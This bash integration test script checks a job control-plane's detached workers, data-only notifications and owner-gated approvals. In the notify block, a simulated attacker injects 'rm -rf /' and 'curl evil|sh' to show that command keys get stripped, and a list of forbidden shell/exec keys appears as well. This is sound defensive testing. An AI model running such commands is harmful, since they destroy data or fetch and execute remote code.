#!/usr/bin/env bash
# cp-integration.test.sh — THE CONTROL-PLANE END-TO-END INTEGRATION GATE (wave-3, §11).
#
# DESIGN DOSSIER §11 (authoritative) + §1/§2/§3/§4/§5/§7/§8/§9. This is NOT a unit
# test of any one piece — every cp_* unit suite already exists (cp-substrate / cp-jobs
# / cp-approval / cp-notify / cp-observe / cp-scheduler). THIS gate drives the REAL,
# WIRED cross-piece flow end-to-end against the whole substrate present on main HEAD
# (the metering lesson: a unit-only gate proves the pieces, not the SEAM between them).
#
# THE HEADLINE FLOW (one wired story, §11 L223):
#   a client STARTS a server-hosted allowlisted job -> the CLIENT PROCESS EXITS
#   (disconnect) -> the job CONTINUES server-side in a DETACHED OS process + COMPLETES
#   -> NOTIFY fires (job_complete, DATA only) -> a gated action surfaces to the OWNER
#   who APPROVES it -> AND an arbitrary-command dispatch is REFUSED. The falsifiable
#   core: the refusal half is proven by a VALID dispatch also succeeding.
#
# THE 8 ASSERTIONS (each a committed block; the three CARDINALS are falsifiable):
#   1. THE FLIGHT FIX (cardinal) — job survives client-process exit via a DETACHED OS
#      process (NOT inline start_route); a FRESH process reads state=done + result.
#      Falsifiable: a job that died on client exit reds F2.
#   2. NOTIFY FIRES — job completion produces a job_complete ping to the owner, DATA
#      ONLY (the notification carries no executable/command field; notification_executes
#      is always False — the inverse-of-RCE).
#   3. OWNER-GATED ACTION — a requires_gate action does NOT dispatch, surfaces to the
#      owner, OWNER APPROVES -> dispatches (audited); owner can OVERRIDE; a NON-owner
#      approve is REJECTED.
#   4. ALLOWLIST REFUSAL (cardinal) — an arbitrary-command dispatch (unknown action /
#      smuggled cmd / shell payload in a param) is REFUSED (422 + audit dispatch_refused);
#      a VALID dispatch succeeds. Falsifiable: a build that let arbitrary through reds it.
#   5. PKI — instance<->server comms are SIGNED+VERIFIED over the REAL http server; a
#      forged/unsigned request is rejected (401).
#   6. NO-SECRET — a RUNTIME-ASSEMBLED secret pushed via ingest is scrubbed/absent;
#      gitleaks over the observe + audit + job + approval + notify stores is clean.
#   7. AUDIT CAPTURES EVERYTHING — every dispatch + approval + refusal is in the audit
#      log (searchable + exportable).
#   8. CONTROL != FLEET (cardinal) — the isolated job worker CANNOT read the PKI private
#      key / audit log (the §2 isolation boundary). Falsifiable: a breach flips a flag.
#
# DISCIPLINE: isolated throwaway HOME + ephemeral Ed25519 keys; planted secret is
# RUNTIME-ASSEMBLED (never static — heimdall-fixture-secret-convention.md); no live
# network (notify uses no connectors, the inbox is a local data file); detached worker
# processes are REAPED; the tree is clean after. Exit 0 = every proof holds.

set -uo pipefail

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO="$(cd "$SELF_DIR/.." && pwd)"
LIB="$REPO/bin/lib"
CLI="$REPO/bin/heimdall-control-plane"

for f in cp_server.py cp_auth.py cp_audit.py cp_allowlist.py cp_handlers.py \
         cp_jobstore.py cp_worker.py cp_approval.py cp_notify.py cp_ingest.py \
         cp_scheduler.py cp_dashboard.py; do
  [ -f "$LIB/$f" ] || { echo "FATAL: $LIB/$f missing (wired server not present)" >&2; exit 2; }
done
[ -x "$CLI" ] || { echo "FATAL: $CLI not executable" >&2; exit 2; }

PY="$(command -v python3 || command -v python || true)"
[ -n "$PY" ] || { echo "FATAL: python not found" >&2; exit 2; }

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf "  \033[32mPASS\033[0m %s\n" "$1"; }
bad() { FAIL=$((FAIL+1)); printf "  \033[31mFAIL\033[0m %s\n" "$1"; }

WORK="$(mktemp -d -t "cp-integration.$(printf 'X%.0s' 1 2 3 4 5 6)")"
# Track detached worker PIDs so the trap REAPS them (no orphan processes after).
WORKER_PIDS=""
cleanup() {
  for p in $WORKER_PIDS; do
    kill "$p" 2>/dev/null || true
  done
  rm -rf "$WORK"
}
trap cleanup EXIT

export HEIMDALL_HOME="$WORK/cphome"
export LIB
export WORK
CP_HOME="$HEIMDALL_HOME/control-plane"

# A RUNTIME-ASSEMBLED secret — never a static literal in source (per the fixture-secret
# convention). The fragments are individually non-matching; only the concatenation forms
# a gitleaks-detectable GitHub-PAT-shaped token at run time. Used to prove the ingest +
# audit stores scrub it / never store it (assertion #6).
_GP_PRE="ghp_"
_GP_A="$(printf 'a%.0s' $(seq 1 20))"
_GP_B="$(printf 'B%.0s' $(seq 1 16))"
PLANTED_SECRET="${_GP_PRE}${_GP_A}${_GP_B}"
export PLANTED_SECRET

echo "============================================================"
echo "CONTROL-PLANE END-TO-END INTEGRATION GATE (§11)"
echo "  home=$HEIMDALL_HOME"
echo "============================================================"

# ──────────────────────────────────────────────────────────────────────────────
# #1 THE FLIGHT FIX (CARDINAL, §4/§2) — a client STARTS a server-hosted job, the
#    CLIENT PROCESS EXITS, the job CONTINUES in a DETACHED OS process (separate
#    session, parented to the OS — NOT inline start_route), and a FRESH process
#    reads state=done + the result. Falsifiable: a job killed on client exit reds F2.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#1 THE FLIGHT FIX (job survives client disconnect, §4) [CARDINAL]"

# The DETACHED worker: a standalone process that drives ONE job to done off the durable
# cp_jobstore log. It sleeps first so the CLIENT is provably gone before completion —
# proving the job does NOT depend on the client connection (the §4 L97 detach contract).
cat >"$WORK/flight_worker.py" <<'PYEOF'
import os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_worker as W
job_id = sys.argv[1]
time.sleep(0.5)  # the client surely exits before the job completes.
W.run_job(job_id, actor_haid="haid:rj.mbp-7f3a",
          home=os.environ["HEIMDALL_HOME"], checkpoints=2)
PYEOF

# The CLIENT: enqueues the job, spawns the worker DETACHED (start_new_session=True so
# killing/exiting the client never kills the worker), prints the job_id + worker pid,
# then EXITS. After this returns, the client is GONE — the job must still complete.
cat >"$WORK/flight_client.py" <<'PYEOF'
import os, sys, subprocess
sys.path.insert(0, os.environ["LIB"])
import cp_jobstore as J
home = os.environ["HEIMDALL_HOME"]
job_id = J.create_job("run-task-X", {"task_id": "flight-job"},
                      instance_haid="haid:rj.mbp-7f3a", home=home)
proc = subprocess.Popen(
    [sys.executable, os.path.join(os.environ["WORK"], "flight_worker.py"), job_id],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    start_new_session=True,  # DETACH: its own session, parented to the OS not the client.
)
print("%s %d" % (job_id, proc.pid))
PYEOF

WORK="$WORK" "$PY" "$WORK/flight_client.py" >"$WORK/flight.out" 2>"$WORK/flight.err"
JOB_ID="$(awk '{print $1}' "$WORK/flight.out")"
WORKER_PID="$(awk '{print $2}' "$WORK/flight.out")"
WORKER_PIDS="$WORKER_PIDS $WORKER_PID"   # register for reaping in the trap.
# the CLIENT process has now EXITED — the command above returned, the client is gone.
if [ -n "$JOB_ID" ] && [ -n "$WORKER_PID" ]; then
  ok "#1 F1 client started job ($JOB_ID), spawned DETACHED worker (pid $WORKER_PID), then EXITED"
else
  bad "#1 F1 client did not return a job_id + detached worker pid"
  cat "$WORK/flight.err" >&2
fi

# A FRESH client process (no shared memory with the starter or the worker) polls the
# durable store until done/timeout — proving the flight fix from a true reconnect.
cat >"$WORK/flight_poll.py" <<'PYEOF'
import os, sys, time
sys.path.insert(0, os.environ["LIB"])
import cp_jobstore as J
home = os.environ["HEIMDALL_HOME"]
job_id = sys.argv[1]
deadline = time.time() + 12
state = result_status = None
while time.time() < deadline:
    folded = J.read_job(job_id, home)
    if folded:
        state = folded.get("state")
        r = folded.get("result")
        result_status = r.get("status") if isinstance(r, dict) else r
        if state in ("done", "cancelled"):
            break
    time.sleep(0.1)
print("%s|%s" % (state, result_status))
PYEOF

FLIGHT_POLL="$("$PY" "$WORK/flight_poll.py" "$JOB_ID" 2>"$WORK/flight_poll.err")"
FINAL_STATE="${FLIGHT_POLL%%|*}"
RESULT_STATUS="${FLIGHT_POLL#*|}"
[ "$FINAL_STATE" = "done" ] \
  && ok "#1 F2 a FRESH process reads state=done (job ran server-side after client exit)" \
  || bad "#1 F2 fresh process did NOT read done (got '$FINAL_STATE') — job died on disconnect"
[ "$RESULT_STATUS" = "prepared" ] \
  && ok "#1 F2 the FRESH process reads the job RESULT (status=prepared)" \
  || bad "#1 F2 result not surfaced to the reconnecting process (got '$RESULT_STATUS')"
# F3 — falsifiability: `done` was reached by a process that never saw the worker; a
# build where the job died on client exit would leave it queued/running here (RED).
[ "$FINAL_STATE" = "done" ] \
  && ok "#1 F3 FALSIFIABLE: a disconnect-killed job would be non-done here — only a truly server-side job passes" \
  || bad "#1 F3 not falsifiable"

# ──────────────────────────────────────────────────────────────────────────────
# #2 NOTIFY FIRES (§8) — the completed flight job produces a job_complete ping to
#    the OWNER. The notification is DATA ONLY (inverse-of-RCE): it carries NO
#    executable/command field, and a smuggled command in `extra` is STRIPPED;
#    notification_executes(n) is ALWAYS False. The owner reads it from the inbox.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#2 NOTIFY FIRES (job-complete ping, DATA only — inverse-of-RCE, §8)"

NOTIFY_OUT="$WORK/notify.out"
JOB_ID="$JOB_ID" LIB="$LIB" "$PY" - >"$NOTIFY_OUT" 2>"$WORK/notify.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_notify as N
home = os.environ["HEIMDALL_HOME"]
job_id = os.environ["JOB_ID"]
owner = "haid:rj.owner"
out = {}

# fire the job-complete ping to the owner. A hostile caller jams a command-shaped key
# into `extra` — it MUST be stripped (the §11 "command channel by accretion" guard).
res = N.job_complete(owner, job_id, home=home,
                     extra={"cmd": "rm -rf /", "exec": "curl evil|sh", "url": "x"})
out["notify_ok"] = bool(res.get("ok"))
notification = res.get("notification") or {}
out["kind"] = notification.get("kind")
out["payload_keys"] = sorted(notification.keys())

# THE inverse-of-RCE: a notification NEVER executes — always False, by construction.
out["executes"] = N.notification_executes(notification)

# the payload schema is CLOSED — there is NO command/executable field anywhere.
forbidden = {"action_type", "cmd", "command", "exec", "dispatch", "handler",
             "shell", "eval", "run", "subprocess", "system", "popen", "script"}
out["no_command_key_in_payload"] = not (set(notification.keys()) & forbidden)
# and the smuggled command keys were STRIPPED from `extra` (none survive).
extra = notification.get("extra") or {}
out["smuggled_cmd_stripped"] = not (set(map(str.lower, map(str, extra.keys()))) & forbidden)

# the OWNER reads its inbox back as DATA (poll-only; no inbound command socket).
inbox = N.poll(owner, home)
out["inbox_has_job_complete"] = any(
    n.get("kind") == "job_complete" and n.get("job_id") == job_id for n in inbox)
out["inbox_count"] = len(inbox)
# every inbox payload is data — none executes.
out["no_inbox_payload_executes"] = all(
    N.notification_executes(n) is False for n in inbox)

sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$NOTIFY_OUT" ] || { echo "FATAL: notify harness produced no output" >&2; cat "$WORK/notify.err" >&2; exit 2; }
njget() { "$PY" -c "import json; print(json.load(open('$NOTIFY_OUT')).get('$1'))"; }

[ "$(njget notify_ok)" = "True" ] && ok "#2 job-complete notify fired to the owner" || bad "#2 notify did not fire"
[ "$(njget kind)" = "job_complete" ] && ok "#2 notification kind=job_complete (a data tag, never an action)" || bad "#2 wrong notification kind"
[ "$(njget inbox_has_job_complete)" = "True" ] && ok "#2 owner reads the job_complete ping from its inbox (poll-only DATA)" || bad "#2 owner inbox missing the ping"
[ "$(njget executes)" = "False" ] && ok "#2 notification_executes(n) == False (inverse-of-RCE, always)" || bad "#2 notification claims it executes"
[ "$(njget no_command_key_in_payload)" = "True" ] && ok "#2 payload has NO command/executable field (closed schema)" || bad "#2 a command field leaked into the payload"
[ "$(njget smuggled_cmd_stripped)" = "True" ] && ok "#2 smuggled cmd/exec keys STRIPPED from extra (no command channel by accretion)" || bad "#2 a smuggled command survived in extra"
[ "$(njget no_inbox_payload_executes)" = "True" ] && ok "#2 every inbox payload is DATA (none executes)" || bad "#2 an inbox payload executes"

# ──────────────────────────────────────────────────────────────────────────────
# #3 OWNER-GATED ACTION (§7) — a requires_gate action (run-suite) does NOT dispatch;
#    it surfaces to the OWNER as `pending`. A NON-owner approve is REJECTED. The OWNER
#    APPROVES -> it dispatches (audited). A second gated action: the owner OVERRIDES
#    (force-approve) -> it dispatches, the override audited. Non-gated still runs direct.
# ──────────────────────────────────────────────────────────────────────────────
echo
echo "#3 OWNER-GATED ACTION (gate + owner approve/override + non-owner rejected, §7)"

GATE_OUT="$WORK/gate.out"
LIB="$LIB" "$PY" - >"$GATE_OUT" 2>"$WORK/gate.err" <<'PYEOF'
import json, os, sys
sys.path.insert(0, os.environ["LIB"])
import cp_approval as Ap
import cp_auth as K
home = os.environ["HEIMDALL_HOME"]
out = {}

owner    = K.Identity("haid:rj.owner", owner=True)
nonowner = K.Identity("haid:dev.laptop", owner=False)

# 1. submit a requires_gate action (run-suite). It MUST NOT dispatch — it enters pending.
sub = Ap.submit(owner, "run-suite", {"suite": "integration"}, home=home)
out["gated_state"] = sub.get("state")            # pending
out["gated_dispatched"] = sub.get("dispatched")  # False
out["gated_verdict"] = sub.get("verdict")        # PENDING
action_id = sub.get("action_id")

# the queue surfaces it to the owner (it is the one pending action).
pending = Ap.list_pending(home)
out["pending_count"] = len(pending)
out["pending_is_ours"] = any(p.get("action_id") == action_id for p in pending)

# 2. a NON-owner attempt to approve the gate MUST be REJECTED (AuthError not_owner), and
#    it MUST NOT dispatch — the gate stays pending.
try:
    Ap.approve(nonowner, action_id, home=home)
    out["nonowner_rejected"] = False
except K.AuthError as e:
    out["nonowner_rejected"] = (e.reason == "not_owner")
out["still_pending_after_nonowner"] = (
    (Ap.get(action_id, home) or {}).get("state") == "pending")

# 3. the OWNER APPROVES -> the action DISPATCHES through the normal §1 path (audited).
appr = Ap.approve(owner, action_id, home=home)
out["approved_state"] = appr.get("state")        # approved
out["approved_dispatched"] = appr.get("dispatched")
out["approved_status"] = appr.get("status")      # 200
out["approved_verdict"] = appr.get("verdict")    # PROVEN

# re-deciding a now-terminal record is refused (a gate is decided exactly once).
try:
    Ap.approve(owner, action_id, home=home)
    out["stale_redecide_refused"] = False
except Ap.ApprovalError as e:
    out["stale_redecide_refused"] = (e.reason == "stale_decision")

# 4. a SECOND gated action: the owner OVERRIDES (force-approve) -> it dispatches; the
#    override is itself a signed, audited act (authority exercised, never hidden).
sub2 = Ap.submit(owner, "run-suite", {"suite": "oracle"}, home=home)
aid2 = sub2.get("action_id")
ovr = Ap.override(owner, aid2, force="approve", home=home)
out["override_state"] = ovr.get("state")         # overridden
out["override_dispatched"] = ovr.get("dispatched")
out["override_verdict"] = ovr.get("verdict")     # PROVEN

# a NON-owner override is also rejected (the override is owner-only too).
sub3 = Ap.submit(owner, "run-suite", {"suite": "unit"}, home=home)
aid3 = sub3.get("action_id")
try:
    Ap.override(nonowner, aid3, force="approve", home=home)
    out["nonowner_override_rejected"] = False
except K.AuthError as e:
    out["nonowner_override_rejected"] = (e.reason == "not_owner")

# 5. a NON-gated action submitted dispatches IMMEDIATELY (it never enters the queue) —
#    proving the gate is selective (gate the irreversible, pass the ordinary).
subng = Ap.submit(owner, "sync-queue", {"queue": "issue"}, home=home)
out["nongated_dispatched"] = subng.get("dispatched")
out["nongated_in_queue"] = subng.get("requires_gate")  # False

sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$GATE_OUT" ] || { echo "FATAL: gate harness produced no output" >&2; cat "$WORK/gate.err" >&2; exit 2; }
gjget() { "$PY" -c "import json; print(json.load(open('$GATE_OUT')).get('$1'))"; }

[ "$(gjget gated_state)" = "pending" ] && [ "$(gjget gated_dispatched)" = "False" ] \
  && ok "#3 a requires_gate action does NOT dispatch — it surfaces as pending" \
  || bad "#3 gated action dispatched instead of surfacing for approval"
[ "$(gjget pending_is_ours)" = "True" ] && ok "#3 the gated action is in the owner's approval queue" || bad "#3 gated action not in the pending queue"
[ "$(gjget nonowner_rejected)" = "True" ] && ok "#3 a NON-owner approve is REJECTED (not_owner)" || bad "#3 a non-owner approved a gate"
[ "$(gjget still_pending_after_nonowner)" = "True" ] && ok "#3 the gate stays pending after the rejected non-owner attempt" || bad "#3 non-owner attempt mutated the gate"
[ "$(gjget approved_state)" = "approved" ] && [ "$(gjget approved_dispatched)" = "True" ] && [ "$(gjget approved_status)" = "200" ] \
  && ok "#3 OWNER APPROVES -> the action DISPATCHES (status 200, verdict $(gjget approved_verdict))" \
  || bad "#3 owner approval did not dispatch the action"
[ "$(gjget stale_redecide_refused)" = "True" ] && ok "#3 a gate is decided exactly once (re-decide refused)" || bad "#3 a terminal gate was re-decided"
[ "$(gjget override_state)" = "overridden" ] && [ "$(gjget override_dispatched)" = "True" ] \
  && ok "#3 OWNER OVERRIDES (force-approve) -> dispatches (verdict $(gjget override_verdict)), override audited" \
  || bad "#3 owner override did not dispatch"
[ "$(gjget nonowner_override_rejected)" = "True" ] && ok "#3 a NON-owner override is REJECTED (not_owner)" || bad "#3 a non-owner overrode a gate"
[ "$(gjget nongated_dispatched)" = "True" ] && [ "$(gjget nongated_in_queue)" = "False" ] \
  && ok "#3 a NON-gated action dispatches immediately (the gate is selective)" \
  || bad "#3 a non-gated action was wrongly queued"
